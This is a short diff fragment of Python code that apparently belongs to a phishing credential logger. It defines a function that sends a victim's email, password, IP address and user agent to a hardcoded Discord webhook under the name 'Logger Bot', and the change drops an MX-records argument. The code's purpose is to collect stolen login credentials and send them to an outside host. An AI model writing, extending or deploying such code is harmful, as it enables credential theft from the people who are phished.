@@ -26,7 +26,7 @@ DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1339995643497681058/XBIW
     #except Exception as e:
         #return [f"Error: {str(e)}"]
 
-def send_discord_message(email, password, ip, useragent, mx_records):
+def send_discord_message(email, password, ip, useragent):
     message = {
         "username": "Logger Bot",
         "avatar_url": "https://i.imgur.com/zW2WJ3o.png",  # Optional bot avatar
